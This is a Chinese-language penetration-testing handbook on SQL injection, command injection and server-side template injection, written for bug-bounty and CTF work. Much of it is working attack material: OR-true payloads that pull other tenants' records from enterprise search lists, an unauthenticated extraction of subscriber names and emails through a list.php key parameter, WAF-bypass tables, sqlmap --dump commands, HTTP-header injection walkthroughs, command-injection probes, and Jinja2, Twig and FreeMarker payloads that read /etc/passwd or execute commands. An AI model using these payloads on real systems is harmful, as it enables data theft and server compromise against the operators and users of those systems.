> 进站检查：能看出条数/内容变化的口，每个过滤参都测；只回「请登录」整段 N/A。按栈选探针（JSON/Mongo 操作符、搜索框 ES、Java HQL/SpEL、有模板 SSTI；SQL 面仍走引号/布尔/延时）。405 后换位置不只有换编码。
> 短表「列表筛选项 OR + total」「邮件订阅 iframe 同目录 list」用标题搜。WooYun 统计 / sqlmap --os-shell / 反弹 shell / 英文附件已砍；现场按栈自己变，不靠教材。

# 注入类漏洞测试手册（SQL注入 / 命令注入 / SSTI）

## SQL 注入

### 列表筛选项 OR + total（ES / 搜索列表）

企业流水、消费、员工名单这类列表，筛的是 `employeeName` / 姓名 / 关键字，回包带 `total` / `totalNum` / `totalSize`，后端经常是 ES 或「能跑一段 SQL 的搜索」。

**这枪很险。** `or (1)=(1)` 在流水/ES 上等于「去掉租户和日期，把全库匹配一遍」。回包 total 上亿是常态，一次查询就能打满集群、拖垮列表、把别的企业流水打到你屏幕上。证明用 **total 数字差分 + 第一条能看出不是自己的** 就停。

1. 先填不存在的串，应空或几条。  
2. 再布尔假：`')and (1)=(2)--` 仍应空（证明能改逻辑，还没放开全库）。  
3. 最后才恒真：`1')or (1)=(1)--+A`（`1=1` 被拦改 `(1)=(1)`）。**只打一枪。** 只看 total，pageSize 保持 1～5。  
4. 空/个位 → 十万、百万、上亿，且第一条是**别的员工/别的企业**流水，才算成。证明到此结束。  
5. **只约束本枪（OR 恒真打 ES/流水全库）：** 同一 payload 不连打/重放，pageSize 不拉满，不点下一页/导出，本枪不用 sqlmap `--dump` / `--risk=3`，不打到删除/更新口。打挂集群不算证明。  
6. 模糊搜索把 `or` 当关键字、或涨出来全是本企业本职可读 → 假点，不报。ES 只吃 Query DSL、这段 SQL 当普通字符串 → 换 DSL/`$where`，别死磕。

这是开场，不是只准打这一条，也**不是**禁止所有注入抽数。UNION / 延时 / 报错 / WAF 编码 / 其它注入口现场按栈自己变；延时比 OR 恒真更安全时优先延时。

### 邮件订阅 iframe 同目录 list（短表有指针）

认：邮件订阅嵌在 iframe 里；同目录 list 的 `key` 当鉴权、拼进 SQL。常见皮是 订阅表单皮 / `alertform.../main/index.php?id=租户`。

打（不登录）：

1. 从 iframe 抄租户 id  
2. 打同目录 `GET /main/list.php?key=`  
3. `key` 被拼进 SQL 当鉴权。`1' OR client_id=租户 LIMIT 1#`（只要这一枪）

算成：回包是该租户订户姓名/邮箱/电话。Wrong Key / 空数组是对照。

假点：没有 list.php；key 走常量比较或预编译。单站没中不删短表这行。不要对全站同皮客户开 FOFA。

### 快速检测

单引号 / 布尔假真 / 延时。405 后换 query / json / header / path。本枪 OR+total **不用** sqlmap `--dump` / `--os-shell`。

### ★ SQL 注入完整工作流（靶场 14+ 题的通用打法；SRC 的最小化约束在靶场不适用）

> 下面这套是**一类题的通用流程**，不是某道题的解法。靶场里 `--dump` 放开跑，拿 flag 优先。
> 分型与实证来源见 `../题型图鉴.md` §1。

**① 注入点与承载方式**

```bash
# GET/POST 参数：引号看报错 → 布尔差分 → 定列数
'  →  1 and 1=1  vs  1 and 1=2  →  order by n（列数）
# POST body 型：注入点在 body（application/x-www-form-urlencoded），载荷与 GET 同套
# JSON 承载型：{"id":"1' ..."}，注意闭合引号层次
# 405/400 → 换承载：query → json → header → path
```

**② 闭合结构推断（黑盒最快路径，先做这步能省一半时间）**

从报错文案反推外层包裹，**比逐个试闭合方式快一个量级**：

```
报错 near ''1'')'      ⇒ 外层是 (name='输入')   ⇒ 载荷用 ') 闭合 + -- - 注释
报错 near ''1''        ⇒ 外层是 (name='输入')   ⇒ 载荷用 ' 闭合 + -- -
报错停在 near ''       ⇒ 通常是关键字被过滤（不是闭合问题）
```

**③ 按注入类型选载荷族**

| 类型 | 判据 | 载荷模板 |
|---|---|---|
| **数字型** | 不加引号就通 | `0 union select 1,2,3,4,5` → `0 union select 1,group_concat(flag),3,4,5 from flag` |
| **字符型报错** | 有报错回显 | `1' and extractvalue(1,concat(0x7e,(select substr(flag,1,16) from flag limit 0,1)))-- -`（`updatexml` 互为备份） |
| **布尔盲注** | 只有真假两种页面 | `ascii(substr((select flag),N,1))>M` 二分（1bit 信道） |
| **时间盲注** | 页面无差异 | `if(ascii(substr(...))>M,sleep(1.2),0)` |
| **order by 后注入** | 排序列可控 | `ORDER BY (select extractvalue(1,concat(0x7e,substr((select flag),pos,len))))` |
| **堆叠/二次** | 多语句或入库再查 | 靶场放开跑，`--dump` 更省事 |

### ★ 非参数位注入：HTTP 头（UA / XFF / Referer / Cookie）—— 靶场 233 实测

> **本条是上面 ① 「换承载：query → json → header → path」的展开**（所以在 ③ 之后、④ 之前插入，不影响 ①→⑤ 主链编号）。
>
> **题面信号**：题目叫「UA 头注入」/ 提示语像「除了参数之外，还有什么位置存在 SQL 注入」/ 面试题式问法
> ⇒ 直接在**请求头**上打，别在参数上磨。参数位通常也能打（同一条查询），但**出题人要的是头**。

**① 怎么认（三步，30 秒）**

```bash
# 1) 正常请求拿基线，看应用是否自曝 SQL
curl -s -X POST -d 'action=test&username=zhangsan' http://TARGET/index.php
#   233 实测回显：SELECT * FROM users WHERE ua='Mozilla/5.0 ...'   ← 直接把拼接语句吐回来
# 2) 在待测头里放一个单引号，看拼接结果是否变形
curl -s -X POST -H "User-Agent: '" -d 'action=test&username=zhangsan' http://TARGET/index.php
#   233 实测回显：SELECT * FROM users WHERE ua='''        ← 引号进了 SQL，注入成立
# 3) 逐个头轮一遍（一次全试，别只试 UA）
```

**② 头清单（每道题只认一个，脚本一次全打）**

```
User-Agent  →  Referer  →  X-Forwarded-For  →  X-Real-IP  →  Client-IP
Cookie  →  Origin  →  X-Forwarded-Host  →  Accept-Language  →  X-Api-Version
```
> 与 `打穿短表.md` §Web 指纹 的 IP 头矩阵同一套思路：**换头名、换大小写、换下划线**。

**③ ★★ 最容易卡死的一点：UNION 回显位与页面字段是「错位」的**

233 实测的字段映射（`SELECT * FROM users`，6 列）：

| UNION 列序号 | 页面位置 | 是否回显 |
|---|---|---|
| 第 1 列 | —（不显示） | ❌ **死列** |
| 第 2 列 | 用户名 | ✅ |
| 第 3 列 | 密码 | ✅ |
| 第 4 列 | 邮箱 | ✅ |
| 第 5 列 | 角色 | ✅ |
| 第 6 列 | —（不显示） | ❌ 死列 |

- **典型误判**：把 `database()` / `group_concat(table_name)` 放在第 1 列 ⇒ 页面**恒显示 `0`**，
  看起来像"函数没执行/被过滤"，其实是**放进了不显示的列**。
- **正确姿势**：先用十六进制常量做标记逐列试
  （`x' UNION SELECT 0,0x4d41524b,0,0,0,0-- -`，`0x4d41524b` = `MARK`，避开引号），
  **看哪一列把标记打出来**，再把枚举表达式放进那个能显示的位置。
- 判据口诀：**「列数对不上」看 `ORDER BY`，「函数没回显」先怀疑列没选中**。

**④ flag 表命名很直白，别过度枚举**

233 实测 `information_schema.columns` 一次就给出全部结构：
```
news:id,title,content,author,created_at | users:id,username,password,email,role,ua | flag:id,flag,description
```
`flag(id, flag, description)` —— 出题人用最直白的表名列名。**先直接 `... FROM flag` 试一把，
不行再上 `information_schema`**，别一上来就盲注枚举（`SKILL.md` §通用规律 33「模拟型靶机」同一条）。

**⑤ 现成命令（sqlmap 够用）**

```bash
# 头注入的 sqlmap 姿势：把整个请求存成文件，标出注入点
sqlmap -r req.txt -p "User-Agent" --batch --level=5 --risk=3 --dump
# 或直接指定
sqlmap -u "http://TARGET/index.php" --data="action=test&username=zhangsan" \
       --headers="User-Agent: *" --batch --level=5 --risk=3 --dump
```

> **省时对照（233 实测）**：手工链 = 5 个请求解决
> （基线 → 单引号确认 → `ORDER BY`/`UNION NULL` 定列数 6 → 十六进制标记定回显位 → `UNION SELECT 0,flag,0,0,0,0 FROM flag`）。
> 已知注入点时，手工比 sqlmap 快得多。

**⑥ 头注入的「幌子参数」现象（233 独立复测确认）**

头注入题常同时给一个**看着像注入点的 param**，实测**它根本没进 SQL**：

```
# 233 实测：username 参数放注入载荷，回显 SQL 一字未变
[参数位 单引号      ] SELECT * FROM users WHERE ua='Mozilla/5.0 hbc'   ← 无任何变化
[参数位 OR 1=1-- -  ] SELECT * FROM users WHERE ua='Mozilla/5.0 hbc'
[参数位 OR 1=1#     ] SELECT * FROM users WHERE ua='Mozilla/5.0 hbc'
[头位   单引号      ] SELECT * FROM users WHERE ua='''                 ← 只有这里变了
```

**判据**：应用回显拼接语句时，**看哪一处输入让回显里的 SQL 结构变了** —— 变了才是注入点，
没变就是幌子。**别在 param 上反复磨闭合方式**（磨不出结果不是闭合问题，是打错了位置）。

**⑦ flag 常是「每次重建实例就换」的（233 实测四实例三值不同）**

| 实例 | flag |
|---|---|
| A | `flag{940edb3f...}` |
| B | `flag{2fdcbe76...}` |
| C | `flag{badd7e68...}` |

⇒ **实例重启/回收后必须重跑注入链取新值**，`--dump` 出来的旧值对新实例无效。
配合平台实例「1 分钟量级回收」的实测（见 `SKILL.md` §零第一层）⇒
**把「启动 + 完整注入链」写成一个脚本一次执行**，别分轮次（分轮必撞回收）。

**④ 黑名单 / WAF 绕过（关键字被剔除时）**

```
and / or      →  ||  /  &&        （MariaDB/MySQL 都认）
union          →  /**/union/**/、UnIoN、双写 ununionion
空格           →  %0a %09 /**/ () 反引号
order by       →  /**/order/**/by、order%0aby
逗号被拦       →  union select 1,2,3 → 用 join 或 limit 偏移
引号被拦       →  0x 十六进制字面量、char() 拼接
报错被拦       →  换布尔 / 延时（别死磕一种信道）
```

```bash
# 放开跑（靶场姿势）
sqlmap -u "http://TARGET/ENDPOINT?id=1" --batch --level=5 --risk=3 --random-agent --dump
sqlmap -r req.txt -p PARAM --dbms=mysql --threads=10 --dump
```

**⑤ 卡点与假点（踩过才会知道的）**

1. **枚举 `information_schema` 必须 `ORDER BY + LIMIT`** —— 不排序结果顺序不定，会漏表漏列。
2. **flag 列常带尾随空白 ⇒ 必须 `TRIM()`** —— 不 TRIM 直接提交会判错（这类"差一个空格"最容易白干）。
3. **报错串有 32 字节截断** ⇒ 分 16 字取，别一次性 substr 太长。
4. **延时阈值必须匹配 sleep 时长**：`sleep(1.2)` 要配 2.0s 左右阈值；等值法 + 全字母表逐位匹配比二分更抗网络抖动；**开跑前先用已知前缀 `flag{` 验证信道**。
5. **引导关无 flag 型**：注入全通、表全 dump 却无 flag、DB 账号无 FILE 权限 ⇒ **flag 在引导通关链路上发放，不在注入点** —— 这类题不要死磕数据库。
6. **同一个参数可能有两种注入类型**：先按报错型打，报错被吞就切布尔/延时，别在一种信道上耗死。

### JSON / Mongo 操作符（按栈，不是每个 path 喷引号）

`{"$ne":""}` / `{"$gt":""}` / `password[$ne]=x`。登录框不当业务参。出他主体或稳定差分才算。

## 命令注入

常见口：filename / ip / ping / 转换 / 诊断页。探针 `;id` / `|id` / `$(id)` / 延时 `sleep 5`。证伪即可，不要本机反弹 shell 当教材。

## SSTI（服务端模板注入）

### 检测 Payload

```
{{7*7}}          → 如果返回 49，存在 SSTI
${7*7}           → Java/FreeMarker
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Thymeleaf (Spring)
```

### 常见框架利用

```python
# Jinja2 (Python/Flask)
{{config}}                           # 信息泄露
{{''.__class__.__mro__[2].__subclasses__()}}  # 获取类
# RCE:
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
```

---
